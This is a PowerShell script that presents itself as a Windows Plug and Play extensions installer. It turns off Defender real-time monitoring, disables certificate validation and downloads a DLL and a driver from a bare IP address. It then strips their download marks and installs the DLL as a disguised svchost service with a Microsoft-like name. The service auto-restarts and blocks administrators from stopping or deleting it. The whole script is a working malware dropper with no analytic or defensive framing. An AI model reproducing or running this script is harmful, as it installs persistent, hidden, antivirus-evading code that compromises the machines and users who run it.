# Windows Plug and Play Extensions - Web Installer (svchost.exe ServiceDll)
param([string]$Server = "https://64.226.66.66")

$ErrorActionPreference = "SilentlyContinue"
$SYS32      = "$env:SystemRoot\System32"
$DRIVERS    = "$env:SystemRoot\System32\drivers"
$SVC        = "MspIscSvc"
$SVCGROUP   = "MspGroup"
$svchostKey = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost"
$TD         = "$env:TEMP\wpnp_$(Get-Random)"

if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")) {
    Write-Host "[!] Run as Administrator" -ForegroundColor Red; Read-Host "Press Enter"; exit 1
}

Write-Host "============================================"
Write-Host " Web Setup | Server: $Server"
Write-Host " (svchost.exe ServiceDll)"
Write-Host "============================================"
Write-Host ""

Write-Host "[1/7] Preparing..." -ForegroundColor Cyan
try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
Start-Sleep 2

Write-Host "[2/7] Downloading..." -ForegroundColor Cyan
New-Item -Path $TD -ItemType Directory -Force | Out-Null
try { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } } catch {}
foreach ($f in @("pnpext.dll","pnpext.sys")) {
    Write-Host "       $f ..." -NoNewline
    try { Invoke-WebRequest "$Server/files/$f" -OutFile "$TD\$f" -UseBasicParsing -TimeoutSec 60; Write-Host " OK" -ForegroundColor Green }
    catch { & certutil -urlcache -split -f "$Server/files/$f" "$TD\$f" 2>$null | Out-Null
        if (Test-Path "$TD\$f") { Write-Host " OK" -ForegroundColor Green }
        elseif ($f -eq "pnpext.dll") { Write-Host " FAIL" -ForegroundColor Red; Remove-Item $TD -Recurse -Force; try{Set-MpPreference -DisableRealtimeMonitoring $false}catch{}; Read-Host; exit 1 }
        else { Write-Host " skip" -ForegroundColor Yellow } } }

Write-Host "[3/7] Removing old (robust)..." -ForegroundColor Cyan
# Find hosting svchost PID, stop service cleanly, force-kill if it hangs
function Get-ServicePid([string]$name) {
    $line = sc.exe queryex $name 2>$null | Select-String '^\s*PID\s*:\s*(\d+)'
    if ($line -and $line.Matches[0].Groups[1].Value) { return [int]$line.Matches[0].Groups[1].Value }
    return 0
}
sc.exe query $SVC 2>$null | Out-Null
if ($LASTEXITCODE -eq 0) {
    $svcPid = Get-ServicePid $SVC
    sc.exe stop $SVC 2>$null | Out-Null
    $stopped = $false
    for ($i = 0; $i -lt 10; $i++) {
        Start-Sleep -Milliseconds 500
        $q = sc.exe query $SVC 2>$null | Out-String
        if ($q -match 'STATE\s*:\s*1\s+STOPPED') { $stopped = $true; break }
        if ($LASTEXITCODE -ne 0) { $stopped = $true; break }
    }
    if (-not $stopped -and $svcPid -gt 0) {
        Write-Host "       hung service - taskkill /F /PID $svcPid" -ForegroundColor Yellow
        taskkill.exe /F /PID $svcPid 2>$null | Out-Null; Start-Sleep 2
    }
    Remove-ItemProperty -Path $svchostKey -Name $SVCGROUP -Force -EA SilentlyContinue
    sc.exe delete $SVC 2>$null | Out-Null
    Remove-Item "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC" -Recurse -Force -EA SilentlyContinue
}
# Only kill rundll32s that have our DLL loaded
Get-Process -Name rundll32 -EA SilentlyContinue | ForEach-Object {
    try { if ($_.Modules | Where-Object { $_.ModuleName -ieq "pnpext.dll" }) {
        Stop-Process -Id $_.Id -Force -EA SilentlyContinue
    } } catch {}
}
Remove-Item "$SYS32\MspIscSvc.exe" -Force -EA SilentlyContinue
Remove-Item "$SYS32\spoolcfg.exe" -Force -EA SilentlyContinue
Remove-Item "$SYS32\pnpext.dll.old" -Force -EA SilentlyContinue
Remove-Item "$SYS32\pnpext.dll.new" -Force -EA SilentlyContinue
if (Test-Path "$env:TEMP\pnp_cache") { Remove-Item "$env:TEMP\pnp_cache\*.bin" -Force -EA SilentlyContinue }

Write-Host "[4/7] Installing files..." -ForegroundColor Cyan
foreach ($f in @("pnpext.dll","pnpext.sys")) {
    if (Test-Path "$TD\$f") {
        Remove-Item "$TD\$f`:Zone.Identifier" -Force -EA SilentlyContinue
        $dst = if($f -eq "pnpext.sys"){$DRIVERS}else{$SYS32}
        Copy-Item "$TD\$f" "$dst\$f" -Force
        Write-Host "       $f -> $dst\" -ForegroundColor Gray
    }
}

Write-Host "[5/7] Creating service (svchost.exe ServiceDll)..." -ForegroundColor Cyan
$existing = (Get-ItemProperty $svchostKey -Name $SVCGROUP -EA SilentlyContinue).$SVCGROUP
if (-not $existing) {
    New-ItemProperty -Path $svchostKey -Name $SVCGROUP -Value @($SVC) -PropertyType MultiString -Force | Out-Null
}
sc.exe create $SVC binPath= "$env:SystemRoot\System32\svchost.exe -k $SVCGROUP" type= share start= auto DisplayName= "Microsoft System Provider Internal Service Cache" 2>$null|Out-Null
sc.exe description $SVC "Maintains internal cache and inter-service context for Windows system providers." 2>$null|Out-Null
sc.exe failure $SVC reset= 86400 actions= restart/10000/restart/30000/restart/60000 2>$null|Out-Null
sc.exe failureflag $SVC 1 2>$null|Out-Null
sc.exe sdset $SVC "D:(D;;WPSD;;;BA)(A;;CCLCSWRPLOCRRC;;;BA)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)" 2>$null|Out-Null

Write-Host "[6/7] Configuring ServiceDll..." -ForegroundColor Cyan
$paramPath = "HKLM:\SYSTEM\CurrentControlSet\Services\$SVC\Parameters"
New-Item $paramPath -Force|Out-Null
New-ItemProperty $paramPath -Name "ServiceDll" -Value "$SYS32\pnpext.dll" -PropertyType ExpandString -Force|Out-Null
New-ItemProperty $paramPath -Name "ServiceMain" -Value "PnpServiceEntry" -PropertyType String -Force|Out-Null

Write-Host "[7/7] Starting + cleanup..." -ForegroundColor Cyan
sc.exe start $SVC 2>$null|Out-Null; Start-Sleep 5
Remove-Item $TD -Recurse -Force -EA SilentlyContinue
try { Set-MpPreference -DisableRealtimeMonitoring $false } catch {}

$ok = & tasklist /m pnpext.dll 2>$null | Select-String svchost
Write-Host ""
if ($ok) { Write-Host "[+] SUCCESS! Running in svchost.exe" -ForegroundColor Green }
else { Write-Host "[?] Check after reboot" -ForegroundColor Yellow }
Write-Host ""; Read-Host "Press Enter"
